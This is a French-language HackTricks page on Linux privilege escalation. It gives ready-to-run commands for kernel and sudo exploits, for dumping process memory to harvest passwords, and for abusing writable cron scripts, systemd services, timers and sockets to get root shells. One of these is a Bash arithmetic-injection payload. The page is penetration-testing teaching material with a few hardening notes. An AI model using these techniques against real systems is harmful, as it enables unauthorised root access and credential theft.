# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informations système

### Informations sur l'OS

Commençons par recueillir des informations sur l'OS en cours d'exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Si vous **avez des permissions d'écriture sur n'importe quel dossier présent dans la variable `PATH`**, vous pourrez peut-être hijack certaines libraries ou binaries :
```bash
echo $PATH
```
### Infos d'environnement

Informations intéressantes, mots de passe ou clés API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Vérifiez la version du kernel et s'il existe un exploit susceptible d'être utilisé pour obtenir une élévation de privilèges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernel vulnérables et quelques **compiled exploits** ici: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
D'autres sites où vous pouvez trouver des **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables depuis ce site vous pouvez faire:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Outils qui peuvent aider à rechercher des kernel exploits :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (à exécuter SUR la victim, ne vérifie que les exploits pour kernel 2.x)

Cherchez toujours **la version du kernel sur Google**, il se peut que votre version du kernel figure dans un exploit et ainsi vous serez sûr que cet exploit est valide.

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

Basé sur les versions vulnérables de Sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable en utilisant ce grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent à des utilisateurs locaux non privilégiés d'escalader leurs privilèges vers root via l'option sudo `--chroot` lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Consultez **smasher2 box of HTB** pour un **exemple** de la manière dont cette vuln pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus de system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Si vous êtes à l'intérieur d'un docker container, vous pouvez tenter de vous en échapper :

{{#ref}}
docker-security/
{{#endref}}

## Disques

Vérifiez **ce qui est mounted et unmounted**, où et pourquoi. Si quelque chose est unmounted, vous pouvez essayer de le mount et vérifier la présence d'informations privées.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez aussi si **un compilateur est installé**. Ceci est utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il peut y avoir une ancienne version de Nagios (par exemple) qui pourrait être exploitée pour escalating privileges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez aussi utiliser **openVAS** pour vérifier si les logiciels installés sur la machine sont obsolètes ou vulnérables.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations qui seront en grande partie inutiles ; il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires qui vérifieront si une version de logiciel installée est vulnérable à des exploits connus_

## Processus

Regardez **quels processus** sont exécutés et vérifiez si un processus a **plus de privilèges que nécessaire** (peut-être un tomcat exécuté par root ?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour monitorer les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsque un ensemble de conditions est rempli.

### Process memory

Certains services d'un serveur sauvegardent des **identifiants en clair dans la mémoire**.\
Normalement vous aurez besoin de **privilèges root** pour lire la mémoire des processus qui appartiennent à d'autres utilisateurs, donc ceci est généralement plus utile quand vous êtes déjà root et souhaitez découvrir d'autres identifiants.\
Cependant, souvenez-vous que **comme utilisateur normal vous pouvez lire la mémoire des processus que vous possédez**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps montrent comment la mémoire est mappée dans l'espace d'adressage virtuel de ce processus** ; elles indiquent aussi les **permissions de chaque région mappée**. Le pseudo-fichier **mem** **expose la mémoire du processus elle-même**. À partir du fichier **maps**, nous savons quelles **régions mémoire sont lisibles** et leurs offsets. Nous utilisons ces informations pour **seek dans le fichier mem et dumper toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` donne accès à la mémoire **physique** du système, pas à la mémoire virtuelle. L'espace d'adresses virtuelles du kernel est accessible via /dev/kmem.\
Typiquement, `/dev/mem` n'est lisible que par **root** et le groupe **kmem**
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinvention sous Linux de l'outil classique ProcDump de la suite Sysinternals pour Windows. Disponible sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour extraire la mémoire d'un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez manuellement supprimer l'exigence root et dump le processus dont vous êtes propriétaire
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants depuis la mémoire du processus

#### Exemple manuel

Si vous trouvez que le processus authenticator est en cours d'exécution:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dumper le processus (voir les sections précédentes pour trouver différentes façons de dumper la mémoire d'un processus) et rechercher des credentials dans la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite les privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (sessions SSH actives - utilisation de sudo) | sshd:                |

#### Regex de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées / Cron jobs

### Crontab UI (alseambusher) s'exécutant en tant que root – privesc via un planificateur web

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s'exécute en tant que root et n'est lié qu'à loopback, vous pouvez quand même y accéder via SSH local port-forwarding et créer un privileged job pour escalader.

Chaîne typique
- Découvrir un port accessible uniquement depuis loopback (ex., 127.0.0.1:8000) et le Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Trouver des identifiants dans des artefacts opérationnels :
  - Backups/scripts avec `zip -P <password>`
  - unit systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel et connexion:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer un job high-priv et l'exécuter immédiatement (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Durcissement
- Ne pas exécuter Crontab UI en tant que root ; restreindre avec un user dédié et des permissions minimales
- Limiter l'écoute à localhost et restreindre l'accès via firewall/VPN ; ne pas réutiliser les mots de passe
- Éviter d'intégrer des secrets dans les unit files ; utiliser des secret stores ou un EnvironmentFile accessible uniquement par root
- Activer audit/logging pour les on-demand job executions

Vérifier si un scheduled job est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (wildcard vuln ? pouvez-vous modifier des fichiers que root utilise ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Par exemple, dans _/etc/crontab_ vous pouvez trouver le PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Remarquez que l'utilisateur "user" a des privilèges d'écriture sur /home/user_)

Si, dans ce crontab, l'utilisateur root essaie d'exécuter une commande ou un script sans définir le PATH. Par exemple : _\* \* \* \* root overwrite.sh_\
Vous pouvez alors obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script exécuté par root contient un “**\***” dans une commande, vous pouvez l'exploiter pour provoquer des comportements inattendus (comme privesc). Exemple:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection dans les cron log parsers

Bash exécute parameter expansion et command substitution avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser exécuté en root lit des champs de log non fiables et les passe dans un contexte arithmétique, un attaquant peut injecter une command substitution $(...) qui s'exécute en root lorsque le cron s'exécute.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Faire en sorte qu'un texte contrôlé par l'attaquant soit écrit dans le log analysé de sorte que le champ semblant numérique contienne une command substitution et se termine par un chiffre. Assurez-vous que votre commande n'écrit pas sur stdout (ou redirigez-la) pour que l'arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Écrasement d'un script cron et symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **directory où vous avez un accès complet**, il peut être utile de supprimer ce dossier et de **créer un dossier symlink vers un autre** qui exécute un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validation des liens symboliques et gestion plus sûre des fichiers

Lors de l'examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers par chemin, vérifiez comment les liens sont gérés :

- `stat()` suit un lien symbolique et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` permettent de résoudre la cible finale et d'afficher les permissions de chaque composant du chemin.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Pour les défenseurs/développeurs, des pratiques plus sûres contre les symlink tricks incluent :

- `O_EXCL` with `O_CREAT`: échoue si le chemin existe déjà (bloque les liens/fichiers pré-créés par un attaquant).
- `openat()`: opérer par rapport à un descripteur de fichier de répertoire de confiance.
- `mkstemp()`: créer des fichiers temporaires de manière atomique avec des permissions sécurisées.

### Binaires cron signés personnalisés avec payloads modifiables
Blue teams signent parfois des binaires lancés par cron en vidant une section ELF personnalisée et en utilisant grep pour chercher une vendor string avant de les exécuter en root. Si ce binaire est group-writable (par ex., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) et que vous pouvez leak the signing material, vous pouvez forger la section et détourner la tâche cron :

1. Utilisez `pspy` pour capturer le flux de vérification. Dans Era, root a exécuté `objcopy --dump-section .text_sig=text_sig_section.bin monitor` suivi de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` puis a exécuté le fichier.
2. Recréez le certificat attendu en utilisant the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construisez un remplacement malveillant (par ex., drop a SUID bash, add your SSH key) et intégrez le certificat dans `.text_sig` pour que le grep passe :
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Écrasez le binaire planifié tout en préservant les bits d'exécution :
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Attendez la prochaine exécution de cron ; une fois que la vérification naïve de la signature réussit, votre payload s'exécute en root.

### Tâches cron fréquentes

Vous pouvez surveiller les processus pour repérer ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Peut-être pouvez-vous en tirer avantage et escalader les privilèges.

Par exemple, pour **surveiller toutes les 0.1s pendant 1 minute**, **trier par les commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez faire :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez aussi utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Sauvegardes root qui préservent les bits de mode définis par l'attaquant (pg_basebackup)

Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données auquel vous pouvez écrire, vous pouvez y déposer un **SUID/SGID binary** qui sera recopié en tant que **root:root** avec les mêmes bits de mode dans la sortie de sauvegarde.

Typical discovery flow (as a low-priv DB user):
- Utilisez `pspy` pour repérer un cron root qui appelle quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` toutes les minutes.
- Confirmez que le cluster source (par ex., `/var/lib/postgresql/14/main`) est accessible en écriture par vous et que la destination (`/opt/backups/current`) devient la propriété de root après l'exécution du job.

Exploitation :
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu'il est invoqué par root les fichiers de destination héritent de **root ownership + attacker-chosen SUID/SGID**. Toute routine privilégiée de backup/copy similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Cron jobs invisibles

Il est possible de créer un cronjob **en plaçant un retour chariot après un commentaire** (sans caractère de saut de ligne), et le cronjob fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Fichiers _.service_ accessibles en écriture

Vérifiez si vous pouvez écrire un fichier `.service`, si oui, vous **pourriez le modifier** afin qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (il se peut que vous deviez attendre le redémarrage de la machine).\
Par exemple créez votre backdoor dans le fichier `.service` avec **`ExecStart=/tmp/script.sh`**

### Binaires de service accessibles en écriture

Gardez à l'esprit que si vous avez des **permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les modifier pour y intégrer des backdoors afin que, lorsque les services seront ré-exécutés, les backdoors s'exécutent.

### systemd PATH - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec:
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans n'importe lequel des dossiers du chemin, vous pouvez être en mesure d'**escalate privileges**. Vous devez rechercher des **relative paths being used on service configurations** dans des fichiers tels que :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** ayant **le même nom que le binaire du chemin relatif** dans le dossier PATH de systemd où vous pouvez écrire, et lorsque le service est invité à exécuter l'action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter les services mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

Les Timers sont des unit files systemd dont le nom se termine par `**.timer**` et qui contrôlent des fichiers `**.service**` ou des événements. Les **Timers** peuvent être utilisés comme alternative à cron car ils offrent une prise en charge intégrée des événements basés sur le calendrier et des événements dépendant d'un temps monotone, et peuvent s'exécuter de façon asynchrone.

Vous pouvez énumérer tous les timers avec :
```bash
systemctl list-timers --all
```
### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez le faire exécuter certaines unités existantes de systemd.unit (comme un `.service` ou un `.target`)
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu'est l'unité :

> L'unité à activer lorsque ce timer expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut est un service ayant le même nom que l'unité timer, à l'exception du suffixe. (Voir ci‑dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité timer soient identiques, à l'exception du suffixe.

Par conséquent, pour abuser de cette permission, vous devrez :

- Trouver une unité systemd (comme une `.service`) qui **exécute un binaire modifiable en écriture**
- Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous avez des **droits d'écriture** sur le **systemd PATH** (pour usurper cet exécutable)

**En savoir plus sur les timers avec `man systemd.timer`.**

### **Activation du timer**

Pour activer un timer vous avez besoin des privilèges root et d'exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un symlink vers celui-ci dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou entre machines dans des modèles client-serveur. Ils utilisent des fichiers de descripteurs Unix standard pour la communication inter-ordinateurs et sont configurés via des fichiers `.socket`.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Fichiers .socket modifiables

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Notez que le système doit utiliser cette configuration de fichier socket sinon le backdoor ne sera pas exécuté_

### Socket activation + writable unit path (create missing service)

Another high-impact misconfiguration is:

- a socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets inscriptibles

Si vous **identifiez n'importe quel socket inscriptible** (_ici nous parlons des Unix Sockets et non des fichiers de config `.socket`_), alors **vous pouvez communiquer** avec ce socket et peut-être exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Notez qu'il peut y avoir des **sockets écoutant des requêtes HTTP** (_Je ne parle pas des fichiers .socket mais des fichiers faisant office de unix sockets_). Vous pouvez vérifier cela avec:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si le socket **répond à une requête HTTP**, alors vous pouvez **communiquer** avec lui et peut-être **exploit some vulnerability**.

### Socket Docker inscriptible

Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est inscriptible par l'utilisateur `root` et les membres du groupe `docker`. Avoir un accès en écriture à ce socket peut conduire à privilege escalation. Voici un aperçu de la façon dont cela peut être fait et des méthodes alternatives si le Docker CLI n'est pas disponible.

#### **Privilege Escalation with Docker CLI**

